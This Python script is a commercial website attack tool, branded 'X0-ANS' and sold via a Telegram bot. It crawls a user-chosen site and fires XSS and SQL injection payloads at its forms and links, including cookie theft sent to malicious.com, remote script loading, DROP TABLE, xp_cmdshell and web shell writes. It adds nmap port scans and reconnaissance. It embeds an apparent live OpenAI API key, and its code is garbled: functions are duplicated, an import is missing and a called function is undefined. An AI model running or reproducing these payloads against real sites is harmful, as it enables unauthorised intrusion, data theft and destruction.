import requests
from bs4 import BeautifulSoup
import socket
import nmap
from colorama import Fore, Style, init
import re
import os
import difflib
import time
import pyfiglet
import random
import sys


# Initialize colorama
init(autoreset=True)

# List of valid API keys
VALID_API_KEYS = ["x0old", "x0m7s", "X0ANS", "anonymous arabs", "x0dark", "x0black widow", "x0round", "key3", "key2"]  # Add more keys as needed

def slow_print(text, color, delay=0.05):
    """Print text slowly with color control."""
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)  # Reset after printing

def check_api_key():
    # Initial message in white with slow print
    slow_print("Please enter your tool access key. If you don't have one, purchase it ..", Fore.WHITE, delay=0.02)
    print("")
    
    # Second message in blue without slow print
    print(Fore.CYAN + "To purchase access keys, contact us via this Telegram bot:" + Style.RESET_ALL)
    
    # Telegram username in red with slow print
    slow_print("https://t.me/AnonDos777Bot", Fore.RED, delay=0.05)
    
    print("")
    
    while True:
        # Request for input key in green with fast slow print
        slow_print("Please enter your API key 🔑 : ", Fore.GREEN, delay=0.02)
        
        # User input in red
        user_input = input(Fore.MAGENTA).strip()  # Use .strip() to remove leading/trailing spaces
        
        # Reset styles after user input
        print(Style.RESET_ALL)

        # If the user input is empty (just Enter), ask again
        if not user_input:
            print(Fore.RED + "Error: You must enter a valid key. Please try again." + Style.RESET_ALL)
            continue  # Loop again to ask for input

        # Check if the entered key is in the valid list
        if user_input in VALID_API_KEYS:
            print(Fore.GREEN + "Welcome!" + Fore.RESET)
            print(Fore.WHITE + "Press Enter to proceed ▶️" + Fore.RESET)
            input()  # Wait for user to press Enter
            return True  # Allow access to the tool
        else:
            # Print random fake error codes to stop the program
            print(Fore.RED + "Invalid access key, please enter a correct key to enter ❌" + Style.RESET_ALL)
            generate_fake_errors()
            return False

def generate_fake_errors():
    # Generate random fake error codes
    for i in range(10):
        print(f"Error {i+1}: {random.randint(1000, 9999)} - Fatal system error.")
    sys.exit()  # Exit the program after printing fake codes

# Run the old tool function
def run_old_tool():
    print("Running the old tool...")
    # Place old tool code here

def main():
    # Check the entered key
    if check_api_key():
        # If the key is valid, run the tool
        run_old_tool()

if __name__ == "__main__":
    main()

# Create a session object
session = requests.Session()

# Set up session to manage redirects and User-Agent
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
})

# Function to print colored text
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)
    
# Input function that validates user input
def enter_num():
    while True:  # Infinite loop until a valid number is entered
        choice = input(Fore.YELLOW + "Choose one of these options by entering its number: " + Style.RESET_ALL + "\n")

        if choice == '1':
            vuln_menu()  # Go to vulnerability scan
            break  # Exit the loop after valid input
        elif choice == '2':
            gather_info_menu()  # Go to information gathering
            break  # Exit the loop after valid input
        else:
            print_colored("Invalid choice! Please enter a valid number.", Fore.RED)

# Function to show logo with slow print
def show_logo():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')  
    
    logo_text = "X0-ANS"
    subtitle = "Anonymous Arabs Organization"
    urlans = "Telegram : "
    urlas = "https://t.me/Anonymusarabs"
    
    # Generate large logo using pyfiglet with a bigger font
    big_logo = pyfiglet.figlet_format(logo_text, font="banner3-D")

    # Display the big logo with slow print
    for line in big_logo.splitlines():
        print(Fore.RED + Style.BRIGHT + line, flush=True)
        time.sleep(0.1)  # Delay between lines for effect

    print()  # New line after logo

    # Display the subtitle with delay
    for char in subtitle:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)
    
    print("\n")  # New line after title

    # Display Telegram link with delay
    for char in urlans:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)

    for char in urlas:
        print(Fore.RED + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.05)

    print("\n")  # New line after link

    # Delay before showing menu
    time.sleep(0.4)

# Main menu function
def main_menu():
    show_logo()
    print_colored("========================================", Fore.CYAN)
    print_colored("           Vulnerability Testing Tool           ", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    print()
    print_colored("1. Vulnerability Scan", Fore.MAGENTA)
    print_colored("2. Gather Website Information", Fore.MAGENTA)
    print()
    print_colored("========================================", Fore.RED)
    print()
    enter_num()

# List of known sites for comparison
known_sites = [
    "www.google.com", "www.facebook.com", "www.youtube.com", 
    "www.amazon.com", "www.wikipedia.org", "www.example.com"
]

# Function to validate URL
def validate_url(url):
    pattern = r'^(www\.)?([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,6}$'
    return re.match(pattern, url) is not None

# Function to suggest similar URLs based on available links using difflib
def suggest_url(url):
    suggestions = difflib.get_close_matches(url, known_sites, n=3, cutoff=0.6)  # Similarity threshold of 60%
    return suggestions if suggestions else None

# Function to check if the site is operational
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"The site is unavailable. HTTP Status: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("The site is unavailable or there is a connection error.", Fore.RED)
        return False

# Validate the entered protocol
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("Please choose a valid protocol (1 for HTTP or 2 for HTTPS)", Fore.RED)
        return False
    return True

# List of vulnerabilities to scan with associated checking functions
def vuln_menu():
    print_colored("\nVulnerability Scan", Fore.CYAN)

    # Validate site input without protocol
    while True:
        url = input(Fore.YELLOW + "Enter the site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
        
        if validate_url(url):
            break
        else:
            suggested_urls = suggest_url(url)
            if suggested_urls:
                print_colored("The link is invalid. Did you mean one of the following links?", Fore.YELLOW)
                for suggested in suggested_urls:
                    print_colored(f"- {suggested}", Fore.GREEN)
                url = suggested_urls[0]  # Choose the first suggestion as default
                break
            else:
                print_colored("Invalid link and no suggestions available. Please enter a valid link.", Fore.RED)

    # Validate the entered protocol
    while True:
        print_colored("1. HTTP", Fore.GREEN)
        print_colored("2. HTTPS", Fore.GREEN)
        protocol_choice = input(Fore.YELLOW + "Choose the protocol: " + Style.RESET_ALL + "\n")
        if validate_protocol(protocol_choice):
            break

    protocol = 'https://' if protocol_choice == '2' else 'http://'
    target_url = protocol + url

    # Check if the site is operational
    while True:
        if check_site_status(target_url):
            break
        else:
            url = input(Fore.YELLOW + "Enter an operational site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
            if validate_url(url):
                target_url = protocol + url

    print_colored("\nSelect the type of examination ( 1 , 2 , 3 , 4 ) :", Fore.CYAN)
    print_colored("1. XSS Check", Fore.GREEN)
    print_colored("2. SQL Injection Check", Fore.GREEN)
    print_colored("3. CSRF Check", Fore.GREEN)
    print_colored("4. Comprehensive scan for all vulnerabilities", Fore.GREEN)
    print_colored("5. Return to previous list", Fore.GREEN)
    
    vuln_choice = input(Fore.YELLOW + "Choose the type of examination :" + Style.RESET_ALL + "\n")
    
    if vuln_choice == '1':
        print_colored("\n XSS checking...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        crawl_and_test(target_url, xss_payloads, "XSS")

    elif vuln_choice == '2':
        print_colored("\n SQL Injection Check...", Fore.CYAN)
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        crawl_and_test(target_url, sql_payloads, "SQL Injection")

    elif vuln_choice == '3':
        print_colored("\n CSRF check...", Fore.CYAN)
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '4':
        print_colored("\n Comprehensive scan for all vulnerabilities...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        
        crawl_and_test(target_url, xss_payloads, "XSS")
        crawl_and_test(target_url, sql_payloads, "SQL Injection")
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '5':
        main_menu()  # Back to main menu
    else:
        print_colored("Incorrect choice!", Fore.RED)
        vuln_menu()

    post_scan_options()

def post_scan_options():
    slow_print("\n Do you want to :", Fore.CYAN, delay=0.05)
    print("1. Return to the checklist")
    print("2. Terminate the program")
    
    choice = input(Fore.YELLOW + "Choose an option:" )
    if choice == '1':
        main_menu()
    elif choice == '2':
        print_colored("Thank you for using the tool ❤️", Fore.CYAN)
        exit()
    else:
        slow_print("Incorrect choice 🚫", Fore.RED, delay=0.02)
        post_scan_options()


# الزحف واختبار الثغرات
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f"Crawl on the site:{url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)

# الزحف وجمع الروابط والفورمز من الموقع
def crawl_site(url):
    crawled_urls = set()
    forms = []

    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = requests.compat.urljoin(url, link['href'])
            if url in full_url and full_url not in crawled_urls:
                crawled_urls.add(full_url)
                time.sleep(1)  # إضافة تأخير بين كل طلب

        forms = soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print_colored(f"A mistake while crawling:🚫 : {e}", Fore.RED)
    
    return crawled_urls, forms
    
    # إنشاء كائن session
session = requests.Session()


# فحص الثغرات وتحديث التقرير
# محاولة فحص الرابط مع إعادة المحاولة في حالة حدوث خطأ
def test_vulnerabilities(base_url, urls, forms, payloads, vuln_type):
    report = []
    
    # فحص الروابط
    for url in urls:
        params = get_params(url)
        for param in params:
            for payload in payloads:
                new_url = f"{url}?{param}={payload}"
                attempt = 0
                while attempt < 3:  # إعادة المحاولة حتى 3 مرات
                    try:
                        response = session.get(new_url, timeout=10)
                        if payload in response.text:
                            report.append({
                                "vuln_type": vuln_type,
                                "param": param,
                                "url": url,
                                "payload": payload,
                                "direct_link": new_url
                            })
                            print_colored(f"✅ Exploit found {vuln_type} Discovered in this parameter : {param} In this link : {url}", Fore.GREEN)
                            break  # الانتقال إلى الباراميتر أو الفورم التالي بعد اكتشاف الثغرة
                        break
                    except requests.exceptions.RequestException as e:
                        attempt += 1
                        print_colored(f"خطأ أثناء فحص الرابط {url}: {e}, إعادة المحاولة ({attempt}/3)", Fore.RED)
                        time.sleep(1)  # انتظار قبل إعادة المحاولة

    # فحص الفورمات
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        action_url = requests.compat.urljoin(base_url, action) if action else base_url
        
        try:
            for payload in payloads:
                form_data = {input_tag.get('name'): payload for input_tag in inputs if input_tag.get('name')}
                if method == 'post':
                    response = session.post(action_url, data=form_data, timeout=10)
                else:
                    response = session.get(action_url, params=form_data, timeout=10)

                if payload in response.text:
                    report.append({
                        "vuln_type": vuln_type,
                        "form_action": action_url,
                        "payload": payload
                    })
                    print_colored(f"✅ Exploit  {vuln_type} In the form that started {action_url}", Fore.RED)
                    break  # الانتقال إلى الفورم التالي بعد اكتشاف الثغرة

        except requests.exceptions.RequestException as e:
            print_colored(f"🔴 Error checking form in link {action_url} : {e}", Fore.RED)

    generate_report(report)




# توليد تقرير مفصل عن الفحص
def generate_report(report):
    if report:
        report_text = ""  # لاحتواء نص التقرير
        for item in report:
            if 'param' in item:
                report_text += f"ثغرة {item['vuln_type']} مكتشفة في الباراميتر '{item['param']}' في الرابط {item['url']}\n"
                report_text += f"رابط مباشر: {item['direct_link']}\n"
                report_text += f"البايلود المستخدم: {item['payload']}\n\n"
            if 'form_action' in item:
                report_text += f"ثغرة {item['vuln_type']} مكتشفة في الفورم في الرابط {item['form_action']}\n"
                report_text += f"البايلود المستخدم: {item['payload']}\n\n"

        # سؤال المستخدم إذا كان يريد حفظ التقرير
        print("")
        
        save_choice = input(Fore.YELLOW + "Do you want to save the report to a text file? (y/n) :").strip().lower()
        
        print("")
        
        if save_choice in ['y', 'yes']:
            save_report_to_file(report_text)
        elif save_choice in ['n', 'no']:
            print("Thank you ❤️")
        else:
            print("🚫 Invalid selection. Thank you for using the tool ❤️")
    else:
        print_colored("🔴 No vulnerabilities were found , No Exploit ❌.", Fore.RED)

# دالة لحفظ التقرير في ملف
def save_report_to_file(report):
    while True:
        print("")
        file_name = input(Fore.YELLOW + "Type the file name with the extension ( .txt ) :" + Style.RESET_ALL + "\n").strip()
        if file_name.endswith(".txt"):
            print("")
            file_path = file_name
            break
        else:
            print("Please make sure to add the .txt extension to the file name.", Fore.RED)

    with open(file_path, "w", encoding='utf-8') as file:
        file.write(report)
    print(f"✅ The report has been saved to the file : {os.path.abspath(file_path)}")

# دالة لطباعة النص بلون محدد (مطلوبة للوظائف)
def print_colored(text, color):
    print(color + text + Fore.RESET)


# الزحف واختبار الثغرات (محدث)
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f" {url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)


# الزحف واختبار CSRF (مطور)
def crawl_and_test_csrf(url):
    print(f" {url}")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    forms = soup.find_all('form')
    csrf_vulns = []

    for form in forms:
        action = form.get('action')
        form_url = url + action if action else url
        inputs = form.find_all('input')

        has_csrf_token = False

        # التحقق من وجود حقل CSRF في الفورم
        for input_tag in inputs:
            input_name = input_tag.get('name')
            if 'csrf' in input_name.lower() or 'token' in input_name.lower():
                has_csrf_token = True

        # التحقق من وجود meta tag للـ CSRF
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            has_csrf_token = True

        # التحقق من هيدر SameSite
        cookies = response.headers.get('Set-Cookie', '')
        if 'SameSite' not in cookies:
            print_colored(f"🔴 warning : The site is not used SameSite To protect the site from a vulnerability => CSRF", Fore.YELLOW)

        # التحقق من هيدر Referer
        if 'Referer' not in response.headers:
            print_colored(f"🔴 Warning : The site does not check the referrer header for CSRF protection .", Fore.YELLOW)

        # إذا لم يتم العثور على رمز CSRF
        if not has_csrf_token:
            csrf_vulns.append(form_url)

    if csrf_vulns:
        print_colored("⚠️ The site may be vulnerable to CSRF ", Fore.RED)
        for vuln in csrf_vulns:
            print(f"📍The site may have a CSRF vulnerability in this link : {vuln}")
    else:
        print_colored("🔰The site is not infected with CSRF vulnerability", Fore.GREEN)


# استخراج البارامترات من الروابط
def get_params(url):
    if '?' not in url:
        return []
    params = url.split('?')[1]
    return [param.split('=')[0] for param in params.split('&')]

# دالة للتحقق من صحة عنوان الموقع
def validate_url(url):
    pattern = r'^(www\.)?([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,6}$'
    return re.match(pattern, url) is not None

# دالة لتقديم اقتراح بناءً على الروابط المتاحة باستخدام difflib
def suggest_url(url):
    # استخدام get_close_matches للبحث عن الروابط المشابهة
    suggestions = difflib.get_close_matches(url, known_sites, n=3, cutoff=0.6)  # عتبة تشابه 60%
    if suggestions:
        return suggestions
    return None

# دالة للتحقق من عمل الموقع
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"الموقع غير متاح. حالة HTTP: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("الموقع غير متاح أو يوجد خطأ في الاتصال.", Fore.RED)
        return False

# التحقق من صحة البروتوكول المدخل
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("يرجى اختيار بروتوكول صحيح (1 لـ HTTP أو 2 لـ HTTPS)", Fore.RED)
        return False
    return True

# دالة لطباعة النص بألوان
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)


# تعريف API Key لـ OpenAI
openai.api_key = 'sk-bfV7dDlfuRSF05n4xEVvO9yIVrdYCls9MHTm4-dbvZT3BlbkFJkk8GEvPbJbF6pqaOsW4NKC6MyFkbu-eFfdm8WM9pIA'  # يجب استبدالها بمفتاح API الخاص بك

def gather_info(url):
    print_colored(f"\nجمع المعلومات عن الموقع: {url}", Fore.CYAN)
    
    # جمع عنوان IP
    domain = url.replace('http://', '').replace('https://', '')
    ip = socket.gethostbyname(domain)
    print(f"عنوان IP: {ip}")

    # جلب معلومات السيرفر
    try:
        wsheaders = requests.get(url).headers
        ws = wsheaders.get('Server', 'Could Not Detect')
        print(f"Web Server: {ws}")
    except requests.RequestException as e:
        print_colored(f"خطأ في الوصول إلى {url}: {e}", Fore.RED)
    
    # كشف نوع الـ CMS
    cmssc = requests.get(url).text
    if '/wp-content/' in cmssc:
        tcms = "WordPress"
    elif 'Joomla' in cmssc:
        tcms = "Joomla"
    elif 'Drupal' in requests.get(f"{url}/misc/drupal.js").text:
        tcms = "Drupal"
    elif '/skin/frontend/' in cmssc:
        tcms = "Magento"
    else:
        tcms = "Could Not Detect"
    print(f"CMS: {tcms}")

    # فحص حماية Cloudflare
    cloudflare_status = "Not Detected"
    try:
        urlhh = f"http://api.hackertarget.com/httpheaders/?q={domain}"
        resulthh = requests.get(urlhh).text
        cloudflare_status = "Detected" if 'cloudflare' in resulthh else "Not Detected"
    except Exception as e:
        print_colored(f"خطأ أثناء فحص Cloudflare: {e}", Fore.RED)
    print(f"Cloudflare: {cloudflare_status}")

    # فحص robots.txt
    rbturl = f"{url}/robots.txt"
    try:
        rbtresponse = requests.get(rbturl).text
        if rbtresponse:
            print(f"Robots File Found:\n{rbtresponse}")
        else:
            print_colored("Robots File Found But Empty!", Fore.YELLOW)
    except:
        print_colored("Could NOT Find robots.txt!", Fore.RED)

    # معلومات WHOIS
    urlwhois = f"http://api.hackertarget.com/whois/?q={domain}"
    resultwhois = requests.get(urlwhois).text
    print(f"WHOIS Lookup:\n{resultwhois}")

    # معلومات GEO IP
    urlgip = f"http://api.hackertarget.com/geoip/?q={domain}"
    resultgip = requests.get(urlgip).text
    print(f"GEO IP Lookup:\n{resultgip}")

    # فحص DNS
    urldlup = f"http://api.hackertarget.com/dnslookup/?q={domain}"
    resultdlup = requests.get(urldlup).text
    print(f"DNS Lookup:\n{resultdlup}")

    # حساب Subnet
    urlscal = f"http://api.hackertarget.com/subnetcalc/?q={domain}"
    resultscal = requests.get(urlscal).text
    print(f"Subnet Calculation:\n{resultscal}")

    # فحص المنافذ باستخدام Nmap
    nm = nmap.PortScanner()
    nm.scan(ip, '1-1024')
    print(f"\nالمنافذ المفتوحة على {ip}:")
    
    for host in nm.all_hosts():
        print(f"تفاصيل الفحص للمضيف: {host}")
        for proto in nm[host].all_protocols():
            print(f"البروتوكول: {proto}")
            lport = nm[host][proto].keys()
            for port in lport:
                print(f"المنفذ: {port}\tالإصدار: {nm[host][proto][port]['product']}")

    # استدعاء دالة الذكاء الاصطناعي لجمع المعلومات الإضافية
    gather_ai_info(domain)

    # العودة إلى القائمة الرئيسية بعد انتهاء الفحص
    print_colored("\nهل ترغب في العودة إلى القائمة الرئيسية؟ (نعم/لا)", Fore.YELLOW)
    choice = input("اختيارك: ").strip().lower()
    
    if choice == "نعم":
        main_menu()
    else:
        print_colored("شكرًا لاستخدامك الأداة!", Fore.CYAN)
        exit()


# دالة للبحث عن المعلومات باستخدام الذكاء الاصطناعي
def gather_ai_info(domain):
    print_colored("\nالبحث عن معلومات إضافية باستخدام الذكاء الاصطناعي...", Fore.CYAN)

    # إنشاء استعلام للذكاء الاصطناعي لجمع المعلومات عن الموقع
    prompt = f"Can you provide more detailed information about the website {domain}? I need details such as when it was founded, its purpose, location, the company's founder, the CEO, and additional useful information."

    try:
        response = openai.Completion.create(
            engine="text-davinci-003",  # اختر النموذج الذي تريد استخدامه
            prompt=prompt,
            max_tokens=300  # الحد الأقصى لطول الإجابة
        )

        ai_info = response.choices[0].text.strip()
        print_colored(f"معلومات إضافية عن {domain}:\n{ai_info}", Fore.GREEN)

    except Exception as e:
        print_colored(f"خطأ أثناء جلب المعلومات من الذكاء الاصطناعي: {e}", Fore.RED)

# تشغيل القائمة الرئيسية
if __name__ == "__main__":
    main_menu()
